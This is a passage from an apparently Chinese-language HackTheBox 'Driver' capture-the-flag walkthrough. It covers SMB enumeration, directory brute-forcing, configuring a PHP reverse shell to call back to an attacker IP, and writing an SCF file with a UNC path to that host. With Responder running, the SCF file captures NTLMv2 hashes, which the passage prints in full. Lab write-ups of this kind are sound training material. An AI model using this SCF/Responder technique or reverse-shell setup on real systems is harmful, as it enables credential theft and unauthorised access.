445/tcp</span><br><span class="line">[+] Supported dialects and settings:</span><br><span class="line">Supported dialects:</span><br><span class="line"> SMB 1.0: <span class="literal">true</span></span><br><span class="line"> SMB 2.02: <span class="literal">true</span></span><br><span class="line"> SMB 2.1: <span class="literal">true</span></span><br><span class="line"> SMB 3.0: <span class="literal">true</span></span><br><span class="line"> SMB 3.1.1: <span class="literal">true</span></span><br><span class="line">Preferred dialect: SMB 3.0</span><br><span class="line">SMB1 only: <span class="literal">false</span></span><br><span class="line">SMB signing required: <span class="literal">false</span></span><br><span class="line">=========================================================</span><br><span class="line">| Domain Information via SMB session <span class="keyword">for</span> driver.htb |</span><br><span class="line">=========================================================</span><br><span class="line">[*] Enumerating via unauthenticated SMB session on 445/tcp</span><br><span class="line">[+] Found domain information via SMB</span><br><span class="line">NetBIOS computer name: DRIVER</span><br><span class="line">NetBIOS domain name: <span class="string">&#x27;&#x27;</span></span><br><span class="line">DNS domain: DRIVER</span><br><span class="line">FQDN: DRIVER</span><br><span class="line">Derived membership: workgroup member</span><br><span class="line">Derived domain: unknown</span><br><span class="line">=======================================</span><br><span class="line">| RPC Session Check on driver.htb |</span><br><span class="line">=======================================</span><br><span class="line">[*] Check <span class="keyword">for</span> null session</span><br><span class="line">[-] Could not establish null session: STATUS_ACCESS_DENIED</span><br><span class="line">[*] Check <span class="keyword">for</span> random user</span><br><span class="line">[-] Could not establish random user session: STATUS_LOGON_FAILURE</span><br><span class="line">[-] Sessions failed, neither null nor user sessions were possible</span><br><span class="line">=============================================</span><br><span class="line">| OS Information via RPC <span class="keyword">for</span> driver.htb |</span><br><span class="line">=============================================</span><br><span class="line">[*] Enumerating via unauthenticated SMB session on 445/tcp</span><br><span class="line">[+] Found OS information via SMB</span><br><span class="line">[*] Enumerating via <span class="string">&#x27;srvinfo&#x27;</span></span><br><span class="line">[-] Skipping <span class="string">&#x27;srvinfo&#x27;</span> run, not possible with provided credentials</span><br><span class="line">[+] After merging OS information we have the following result:</span><br><span class="line">OS: Windows 10 Enterprise 10240</span><br><span class="line">OS version: <span class="string">&#x27;10.0&#x27;</span></span><br><span class="line">OS release: <span class="string">&#x27;1507&#x27;</span></span><br><span class="line">OS build: <span class="string">&#x27;10240&#x27;</span></span><br><span class="line">Native OS: Windows 10 Enterprise 10240</span><br><span class="line">Native LAN manager: Windows 10 Enterprise 6.3</span><br><span class="line">Platform <span class="built_in">id</span>: null</span><br><span class="line">Server <span class="built_in">type</span>: null</span><br><span class="line">Server <span class="built_in">type</span> string: null</span><br><span class="line">[!] Aborting remainder of tests since sessions failed, rerun with valid</span><br><span class="line">credentials</span><br><span class="line">Completed after 37.96 seconds</span><br></pre></td></tr></table></figure>

<p>没有更多有价值的信息，现在是<strong>能上传</strong>，但是<strong>不能访问</strong>，<strong>不知道上传之后的⽂件位置</strong>。根据技术栈，上传⼀个php反弹shell⽂件，<strong>尝试⽬录爆破。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> updatedb </span><br><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ locate reverse-shell </span><br><span class="line">/usr/share/laudanum/php/php-reverse-shell.php</span><br><span class="line">/usr/share/laudanum/wordpress/templates/php-reverse-shell.php</span><br><span class="line">/usr/share/metasploit-framework/docs/metasploit-framework.wiki/How-to-use-areverse-shell-in-Metasploit.md</span><br><span class="line">/usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php</span><br><span class="line">/usr/share/seclists/Web-Shells/laudanum-1.0/wordpress/templates/php-reverseshell.php</span><br><span class="line">/usr/share/webshells/perl/perl-reverse-shell.pl</span><br><span class="line">/usr/share/webshells/php/php-reverse-shell.php</span><br><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php</span><br><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ vim shell.php </span><br><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ grep -i <span class="string">&quot;change this&quot;</span> shell.php </span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;10.10.16.9&#x27;</span>; // CHANGE THIS</span><br><span class="line"><span class="variable">$port</span> = 443; // CHANGE THIS</span><br></pre></td></tr></table></figure>

<p>在如下页面上传：</p>
<img src="/posts/23837ad8/1732292323766.png" class="" width="1732292323766">

<p>在目录爆破前，考虑到页面有认证，认证时burp拦截请求头：</p>
<img src="/posts/23837ad8/1732292448583.png" class="" width="1732292448583">

<p>即：<code>Authorization: Basic YWRtaW46YWRtaW4=</code>。然后开始爆破：</p>
<p>使用<code>feroxbuster</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver] </span><br><span class="line">└─$ feroxbuster -u http://driver.htb -x php -H <span class="string">&quot;Authorization: Basic YWRtaW46YWRtaW4=&quot;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-listlowercase-2.3-medium.txt</span><br><span class="line">___ ___ __ __ __ __ __ ___ </span><br><span class="line">|__ |__ |__) |__) | / ` / \ \_/ | | \ |__ </span><br><span class="line">| |___ | \ | \ | \__, \__/ / \ | |__/ |___ </span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher 🤓 ver: 2.10.3 </span><br><span class="line">───────────────────────────┬──────────────────────</span><br><span class="line">🎯 Target Url │ http://driver.htb</span><br><span class="line">🚀 Threads │ 50</span><br><span class="line">📖 Wordlist │ /usr/share/seclists/Discovery/WebContent/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">👌 Status Codes │ All Status Codes!</span><br><span class="line">💥 Timeout (secs) │ 7</span><br><span class="line">🦡 User-Agent │ feroxbuster/2.10.3</span><br><span class="line">💉 Config File │ /etc/feroxbuster/ferox-config.toml</span><br><span class="line">🤯 Header │ Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">🔎 Extract Links │ <span class="literal">true</span></span><br><span class="line">💲 Extensions │ [php]</span><br><span class="line">🏁 HTTP methods │ [GET]</span><br><span class="line">🔃 Recursion Depth │ 4</span><br><span class="line">───────────────────────────┴──────────────────────</span><br><span class="line">🏁 Press [ENTER] to use the Scan Management Menu™</span><br><span class="line">──────────────────────────────────────────────────</span><br><span class="line">301 GET 2l 10w 148c http://driver.htb/images =&gt;</span><br><span class="line">http://driver.htb/images/ </span><br><span class="line">200 GET 185l 379w 4279c http://driver.htb/index.php </span><br><span class="line">200 GET 217l 461w 5119c http://driver.htb/fw_up.php </span><br><span class="line">200 GET 709l 4309w 366212c http://driver.htb/images/ricoh.png </span><br><span class="line">200 GET 185l 379w 4279c http://driver.htb/ </span><br><span class="line">[####################] - 21m 415268/415268 0s found:5 errors:30 </span><br><span class="line">[####################] - 21m 207629/207629 168/s http://driver.htb/</span><br><span class="line">[####################] - 21m 207629/207629 168/s </span><br><span class="line">http://driver.htb/images/</span><br></pre></td></tr></table></figure>

<p>用<code>gobuster</code>也是okd：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ gobuster <span class="built_in">dir</span> -u http://driver.htb -U admin -P admin -x php -w /usr/share/wordlists/dirb/common.txt </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url: http://driver.htb</span><br><span class="line">[+] Method: GET</span><br><span class="line">[+] Threads: 10</span><br><span class="line">[+] Wordlist: /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Negative Status codes: 404</span><br><span class="line">[+] User Agent: gobuster/3.6</span><br><span class="line">[+] Auth User: admin</span><br><span class="line">[+] Extensions: php</span><br><span class="line">[+] Timeout: 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images (Status: 301) [Size: 148] [--&gt;</span><br><span class="line">http://driver.htb/images/]</span><br><span class="line">/Images (Status: 301) [Size: 148] [--&gt;</span><br><span class="line">http://driver.htb/Images/]</span><br><span class="line">/index.php (Status: 200) [Size: 4279]</span><br><span class="line">/Index.php (Status: 200) [Size: 4279]</span><br><span class="line">/index.php (Status: 200) [Size: 4279]</span><br><span class="line">Progress: 9228 / 9230 (99.98%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>均并没有实质性发现。其实还有很多办法交叉验证：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ ffuf -c -H <span class="string">&#x27;Authentication: Basic YWRtaW46YWRtaW4=&#x27;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u</span><br><span class="line">http://10.10.16.9/FUZZ -e .php,.zip,.txt,.pdf </span><br><span class="line"> /<span class="string">&#x27;___\ /&#x27;</span>___\ /<span class="string">&#x27;___\ </span></span><br><span class="line"><span class="string"> /\ \__/ /\ \__/ __ __ /\ \__/ </span></span><br><span class="line"><span class="string"> \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ </span></span><br><span class="line"><span class="string"> \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ </span></span><br><span class="line"><span class="string"> \ \_\ \ \_\ \ \____/ \ \_\ </span></span><br><span class="line"><span class="string"> \/_/ \/_/ \/___/ \/_/ </span></span><br><span class="line"><span class="string"> v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">:: Method : GET</span></span><br><span class="line"><span class="string">:: URL : http://10.10.16.9/FUZZ</span></span><br><span class="line"><span class="string">:: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-</span></span><br><span class="line"><span class="string">2.3-medium.txt</span></span><br><span class="line"><span class="string">:: Header : Authentication: Basic YWRtaW46YWRtaW4=</span></span><br><span class="line"><span class="string">:: Extensions : .php .zip .txt .pdf </span></span><br><span class="line"><span class="string">:: Follow redirects : false</span></span><br><span class="line"><span class="string">:: Calibration : false</span></span><br><span class="line"><span class="string">:: Timeout : 10</span></span><br><span class="line"><span class="string">:: Threads : 40</span></span><br><span class="line"><span class="string">:: Matcher : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">:: Progress: [1102800/1102800] :: Job [1/1] :: 66666 req/sec :: Duration:</span></span><br><span class="line"><span class="string">[0:00:21] :: Errors: 1102800 ::</span></span><br></pre></td></tr></table></figure>

<p>可同时开多个目录扫描并发进行，提高效率</p>
<h4 id="攻击面分析："><a href="#攻击面分析：" class="headerlink" title="攻击面分析："></a>攻击面分析：</h4><p>接下来该怎么办？ 这⾥需要知识储备，需要对windows内⽹、smb、内⽹协议等等有深刻的理解，才可能构建攻击场景，当然也需要试错，毕竟即使理解smb下的⽹络机制，有⼿段触发底层内⽹协议，但作为⿊盒测试，还是要猜，要不断尝试试。</p>
<p>这里涉及三个⽅⾯的知识点：<strong>内⽹认证机制、内⽹协议和SMB</strong></p>
<ul>
<li><p><code>内网认证机制</code>：内⽹认证机制是⼀个⼴泛⽽复杂的话题，但这⾥限制在适⽤smb相关的认证。⾮域环境下，⼀般是ntlm加密。这套加密体系，早期叫做LM (LAN Manager)，安全性⾮常低，由于它使⽤简单的哈希算法（不包含盐值），并将密码分割成7个字符的块后再分别哈希，使其极易被暴⼒破解。再之后是<strong>NTLMv1</strong>，⽐LM有更好的安全性，但仍可被较容易地破解，特别是当攻击者能够捕获到⽹络中的认证流量时。当前⼴泛使⽤的版本是<strong>NTLMv2</strong>，它进⼀步增强了安全性，通过引⼊客户端和服务器的挑战响应，以及在哈希过程中使⽤HMAC-MD5，这使得它⽐前两者更难被破解。但在某些条件下，特别是使⽤弱密码时，仍然存在被被暴⼒破解的可能。</p>
</li>
<li><p><code>内网协议</code>：内⽹协议，内⽹中可以⽤dns解析主机名到ip，但内⽹并不⼀定⼀直有dns，⼀般内⽹中在没有dns的时候，解析协议就会降级，降为<strong>NBT-NS (NetBIOS Name Service)</strong> 和 <strong>LLMNR (Link-Local Multicast Name Resolution)</strong> 这种⼴播的协议，smb就是使⽤的这种降级协议。</p>
</li>
<li><p><code>SMB</code>：SMB（Server Message Block）是⼀种在⽹络上⽤于⽂件共享、打印服务和其他⽹络通信的应⽤层协议。最初由IBM开发并由Microsoft进⼀步扩展，SMB协议使计算机能够在局域⽹（LAN）中访问⽂件、打印机、串⾏端⼝和通信。随着技术的发展，SMB协议经历了多次重要的更新，包括SMB 1.0、SMB 2.0、SMB 2.1、SMB 3.0和最新的SMB 3.1.1。每个版本都在性能、效率和安全性⽅⾯进⾏了改进，尤其是从SMB 2.0开始，显著增加了对⼤型⽂件的传输速度和减少了⽹络延迟。SMB协议⽀持多种认证⽅法，主要的包括<strong>NTLM（NT LAN Manager）</strong>和<strong>Kerberos</strong>。<strong>NTLM是⼀种挑战&#x2F;响应认证协议</strong>，⼴泛⽤于没有Active Directory的环境。它通过不直接在⽹络中传输⽤户的密码，⽽是<strong>使⽤密码的散列值来完成认证</strong>，提供了基本的安全保障。⽽在Active Directory环境中，Kerberos成为⾸选的认证⽅法。</p>
</li>
</ul>
<p>当然在打这个靶场的过程中：还让我了解到<code>嗅探</code>这回事：</p>
<p>知道怎么嗅探，有⼯具可⽤，<code>内⽹嗅探</code>著名的是<code>responder</code>。Responder 可以对接收到的NTLM认证尝试进⾏<strong>中间⼈攻击（MITM）</strong>，<strong>通过向请求者发送伪造的NTLM挑战来获取NTLM响应</strong>。这个响应包含了<code>加密后的⽤户凭据的散列值</code>。Responder 不直接解密这些散列值；⽽是<strong>采集这些数据</strong>，以便<strong>通过离线攻击解码这些散列</strong>。Windows下有<code>inveigh</code>这个替代品。</p>
<p>最后还要解决⼀个问题，在这样的场景下<strong>有触发ntlm认证的⼿段吗？</strong>就是在smb应⽤内发起某个访问，触发认证，让responder能有⽤武之地，作为中间⼈攻击的发起者，<strong>但总得有流量啊</strong>！！！</p>
<p>Payload要传上去，这好像不难，看到driver.htb的上传⻚⾯没有做很多限制，貌似各类型⽂件都可以上传。但<strong>怎么触发某种访问，进⽽触发ntlm认证？</strong>这⾥要⽤到<code>scf⽂件</code>，你可以在baidu中看到这种⽂件类型的介绍<code>[explorer.scf_百度百科](https://baike.baidu.com/item/explorer.scf)</code></p>
<p>总而言之，<code>SCF⽂件</code>是⼀种Windows Shell ⽂件，⽤于执⾏特定的系统命令。这种⽂件格式虽然不太常⻅，但功能很对我们渗透测试的应用，可以⽤来⾃动化某些与Windows资源管理器交互的任务，例如打开特定的系统⼯具或控制资源管理器的⾏为。SCF ⽂件是纯⽂本⽂件，可以使⽤任何⽂本编辑器创建和编辑。⽂件内容定义了要执⾏的命令，以及可能的⼀些参数设置。从百度词条中，我们编辑⼀个SCF⽂件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=explorer.exe,1</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=Explorer</span><br></pre></td></tr></table></figure>

<p>它能执⾏系统命令，站在渗透测试视⻆来看，结合当前的处境、场景和能⼒。既然<strong>它能触发系统命令</strong>，那就访问⼀个smb位置，不存在的位置，这样<strong>就能导致解析协议降级到nbt-ns或llmnr</strong>，这样就有可能触发ntlm认证，我们就可能做到responder的mitm，也就是中间⼈攻击。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">cat</span> test.scf </span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.16.9\redteamnotes</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=Explorer</span><br></pre></td></tr></table></figure>

<p>构想到尝试到⽅案，甚⾄实现都有了，做出尝试。</p>
<p><code>crackmapexec</code>或<code>nxc</code>有自动化的攻击有涉及到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/aptlabs]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nxc smb -L | grep slinky</span><br><span class="line">[*] slinky Creates windows shortcuts with the icon</span><br><span class="line">attribute containing a UNC path to the specified SMB server <span class="keyword">in</span> all shares with</span><br><span class="line">write permissions</span><br></pre></td></tr></table></figure>

<p>利用文章：(<a target="_blank" rel="noopener" href="https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky">https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-slinky</a>)</p>
<h4 id="smb共享scf⽂件攻击"><a href="#smb共享scf⽂件攻击" class="headerlink" title="smb共享scf⽂件攻击"></a>smb<strong>共享</strong>scf⽂件攻击</h4><p>确定⽹卡名<code>tun0</code>，然后启动responder监听：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ ip a </span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group</span><br><span class="line">default qlen 1000</span><br><span class="line"> <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line"> inet 127.0.0.1/8 scope host lo</span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line"> inet6 ::1/128 scope host noprefixroute </span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP</span><br><span class="line">group default qlen 1000</span><br><span class="line"> <span class="built_in">link</span>/ether 00:0c:29:67:78:15 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"> inet 172.16.94.128/24 brd 172.16.94.255 scope global dynamic noprefixroute</span><br><span class="line">eth0</span><br><span class="line"> valid_lft 1420sec preferred_lft 1420sec</span><br><span class="line"> inet6 fe80::84f7:88a9:9ab1:214d/64 scope <span class="built_in">link</span> noprefixroute </span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line">12: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel</span><br><span class="line">state UNKNOWN group default qlen 500</span><br><span class="line"> <span class="built_in">link</span>/none </span><br><span class="line"> inet 10.10.16.9/23 scope global tun0</span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line"> inet6 dead:beef:4::1007/64 scope global </span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line"> inet6 fe80::6404:9b56:ebd4:d95/64 scope <span class="built_in">link</span> stable-privacy proto</span><br><span class="line">kernel_ll </span><br><span class="line"> valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>在<code>tun0</code>⽹卡上启动responder：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> responder -I tun0 -v __</span><br><span class="line"> .----.-----.-----.-----.-----.-----.--| |.-----.----.</span><br><span class="line"> | _| -__|__ --| _ | _ | | _ || -__| _|</span><br><span class="line"> |__| |_____|_____| __|_____|__|__|_____||_____|__|</span><br><span class="line"> |__|</span><br><span class="line"> NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br><span class="line"> To support this project:</span><br><span class="line"> Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line"> Paypal -&gt; https://paypal.me/PythonResponder</span><br><span class="line"> Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line"> To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line">[+] Poisoners:</span><br><span class="line"> LLMNR [ON]</span><br><span class="line"> NBT-NS [ON]</span><br><span class="line"> MDNS [ON]</span><br><span class="line"> DNS [ON]</span><br><span class="line"> DHCP [OFF]</span><br><span class="line">[+] Servers:</span><br><span class="line"> HTTP server [ON]</span><br><span class="line"> HTTPS server [ON]</span><br><span class="line"> WPAD proxy [OFF]</span><br><span class="line"> Auth proxy [OFF]</span><br><span class="line"> SMB server [ON]</span><br><span class="line"> Kerberos server [ON]</span><br><span class="line"> SQL server [ON]</span><br><span class="line"> FTP server [ON]</span><br><span class="line"> IMAP server [ON]</span><br><span class="line"> POP3 server [ON]</span><br><span class="line"> SMTP server [ON]</span><br><span class="line"> DNS server [ON]</span><br><span class="line"> LDAP server [ON]</span><br><span class="line"> MQTT server [ON]</span><br><span class="line"> RDP server [ON]</span><br><span class="line"> DCE-RPC server [ON]</span><br><span class="line"> WinRM server [ON]</span><br><span class="line"> SNMP server [OFF]</span><br><span class="line">[+] HTTP Options:</span><br><span class="line"> Always serving EXE [OFF]</span><br><span class="line"> Serving EXE [OFF]</span><br><span class="line"> Serving HTML [OFF]</span><br><span class="line"> Upstream Proxy [OFF]</span><br><span class="line">[+] Poisoning Options:</span><br><span class="line"> Analyze Mode [OFF]</span><br><span class="line"> Force WPAD auth [OFF]</span><br><span class="line"> Force Basic Auth [OFF]</span><br><span class="line"> Force LM downgrade [OFF]</span><br><span class="line"> Force ESS downgrade [OFF]</span><br><span class="line">[+] Generic Options:</span><br><span class="line"> Responder NIC [tun0]</span><br><span class="line"> Responder IP [10.10.16.9]</span><br><span class="line"> Responder IPv6 [dead:beef:4::1007]</span><br><span class="line"> Challenge <span class="built_in">set</span> [random]</span><br><span class="line"> Don<span class="string">&#x27;t Respond To Names [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string"> Responder Machine Name [WIN-B87ERV8GOUE]</span></span><br><span class="line"><span class="string"> Responder Domain Name [SFNW.LOCAL]</span></span><br><span class="line"><span class="string"> Responder DCE-RPC Port [47745]</span></span><br><span class="line"><span class="string">[+] Listening for events...</span></span><br></pre></td></tr></table></figure>

<p>然后在drvier.htb的上传⻚⾯中上传scf⽂件。随着提交完成，很快我们<strong>捕捉到了流量和hash</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line">[SMB] NTLMv2-SSP Client : 10.129.40.36</span><br><span class="line">[SMB] NTLMv2-SSP Username : DRIVER\tony</span><br><span class="line">[SMB] NTLMv2-SSP Hash :</span><br><span class="line">tony::DRIVER:b558c4920db32a40:EDEFDDF5010502EB0BE3049977FD6CE0:010100000000000000B9E32944A5DA019005C2FBCD3E5D1A0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.省略</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">[SMB] NTLMv2-SSP Client : 10.129.40.36</span><br><span class="line">[SMB] NTLMv2-SSP Username : DRIVER\tony</span><br><span class="line">[SMB] NTLMv2-SSP Hash :</span><br><span class="line">tony::DRIVER:12430e8b200482bf:87E6078FDC62C2034CA53A176E141648:010100000000000000B9E32944A5DA01526894628D5AA73E0000000002000800530046004E00570001001E00570049004E002D00420038003700450052005600380047004F005500450004003400570049004E002D00420038003700450052005600380047004F00550045002E00530046004E0057002E004C004F00430041004C0003001400530046004E0057002E004C004F00430041004C0005001400530046004E0057002E004C004F00430041004C000700080000B9E32944A5DA01060004000200000008003000300000000000000000000000002000003754E27C9803F40A182B2657EB8193AA5EB370597B636D83AE5AB2CE59E879CA0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003900000000000000000000000000</span><br><span 